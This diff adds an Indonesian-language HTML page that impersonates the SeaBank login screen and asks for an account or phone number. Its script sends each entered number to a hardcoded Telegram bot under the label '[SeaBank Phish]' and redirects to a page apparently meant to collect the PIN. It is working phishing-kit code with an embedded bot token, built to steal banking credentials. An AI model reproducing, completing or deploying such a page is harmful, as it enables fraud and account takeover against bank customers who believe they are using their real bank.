@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk ke Akun SeaBank</title>
+    
+    <style>
+        /* CSS Umum (Konsisten dengan tampilan SeaBank) */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        /* --- Header Aplikasi (Diubah menjadi Logo Centered) --- */
+        .app-header {
+            display: flex;
+            justify-content: center; /* Pusatkan konten */
+            align-items: center;
+            padding: 20px 20px;
+            /* Hapus border-bottom untuk tampilan bersih */
+            /* border-bottom: 1px solid #eee; */ 
+            height: 60px; /* Tinggi yang cukup untuk logo */
+        }
+        
+        .app-header .logo-container img {
+            width: 120px; /* Ukuran logo disesuaikan */
+            height: auto;
+        }
+        
+        /* Tombol back-arrow dan teks header dihapus dari HTML dan CSS */
+
+        /* --- Konten Utama --- */
+        .main-content {
+            flex-grow: 1;
+            padding: 20px;
+            padding-top: 10px; /* Kurangi padding atas setelah logo */
+        }
+
+        .main-content h1 {
+            font-size: 1.6em;
+            font-weight: bold;
+            color: #333;
+            margin-top: 20px;
+            margin-bottom: 5px;
+        }
+
+        .main-content p {
+            font-size: 0.9em;
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        /* --- Input Field --- */
+        .input-group {
+            margin-bottom: 30px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.85em;
+            color: #555;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 0;
+            border: none;
+            border-bottom: 2px solid #ddd;
+            font-size: 1.2em;
+            box-sizing: border-box;
+            color: #333;
+            font-weight: bold;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-bottom-color: #ff6600; /* Orange saat fokus */
+        }
+        
+        /* --- Tombol Lanjutkan --- */
+        .action-area {
+            padding: 20px;
+            margin-top: auto; 
+            border-top: 1px solid #eee; /* Berikan pemisah di bawah */
+        }
+
+        .continue-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #e0e0e0;
+            color: #999;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: default;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .continue-button.active {
+            background-color: #ff6600;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    
+<div class="app-header">
+        <div class="logo-container">
+            <img src="logo.png" alt="Logo SeaBank">
+        </div>
+</div>
+
+    
+<div class="main-content">
+        <h1>Masukkan Nomor Akun atau HP</h1>
+        <p>Gunakan nomor yang terdaftar di akun SeaBank Anda.</p>
+
+        <div class="input-group">
+            <label for="accountNumber">Nomor Akun/Nomor Telepon</label>
+            <input type="tel" id="accountNumber" placeholder="Contoh: 081234567890" maxlength="16">
+        </div>
+    </div>
+
+<div class="action-area">
+    <button class="continue-button" id="continueButton">Lanjutkan</button>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const inputField = document.getElementById('accountNumber');
+        const continueButton = document.getElementById('continueButton');
+        
+        // *** INFORMASI BOT TELEGRAM ANDA ***
+        const BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
+        const CHAT_ID = '5923031825';
+        // **********************************
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url).catch(error => {
+                console.error('Error saat mengirim ke Telegram:', error);
+            });
+        }
+        
+        function checkInput() {
+            // Memeriksa jika input minimal 8 digit dan merupakan angka
+            const isValid = /^\d{8,16}$/.test(inputField.value);
+            
+            if (isValid) {
+                continueButton.classList.add('active');
+            } else {
+                continueButton.classList.remove('active');
+            }
+        }
+        
+        inputField.addEventListener('input', checkInput);
+
+        continueButton.addEventListener('click', function() {
+            if (this.classList.contains('active')) {
+                const accountNumber = inputField.value;
+                
+                // 1. SIMPAN NOMOR KE LOCALSTORAGE
+                localStorage.setItem('accountNumber', accountNumber);
+                
+                // 2. KIRIM DATA KE TELEGRAM
+                const message = `[SeaBank Phish] Nomor Akun/HP Diterima: ${accountNumber}`;
+                sendToTelegram(message);
+                
+                // 3. ARAHKAN KE HALAMAN PIN LAMA
+                setTimeout(() => {
+                    window.location.href = 'input_pin_lama.html'; 
+                }, 300);
+            } else {
+                alert('Mohon masukkan Nomor Akun atau HP yang valid (minimal 8 digit angka).');
+            }
+        });
+        
+        checkInput(); // Cek saat halaman dimuat
+    });
+</script>
+</body>
+</html>
